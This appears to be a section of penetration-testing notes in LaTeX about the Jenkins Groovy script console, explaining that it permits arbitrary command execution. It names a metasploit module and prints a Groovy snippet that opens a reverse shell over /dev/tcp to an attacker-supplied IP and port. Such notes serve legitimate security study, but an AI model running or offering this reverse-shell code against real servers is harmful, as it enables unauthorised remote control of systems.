\section{Script Console}
The script console can be reached at the URL \verb+http://URL:8000/script+.
This console allows a user to run Apache
\href{https://en.wikipedia.org/wiki/Apache_Groovy}{Groovy scripts}, which are
an object-oriented Java-compatible language. The language is similar to Python
and Ruby. Groovy source code gets compiled into Java Bytecode and can run on
any platform that has JRE installed.

Using this script console, it is possible to run arbitrary commands,
functioning similarly to a web shell.

There are various ways that access to the script console can be leveraged to
gain a reverse shell. For example,
\verb+exploit/multi/http/jenkins_script_console+  metasploit module or by using
this script that creats a rshell
\begin{verbatim}
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/iIP/PORT;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()
\end{verbatim}
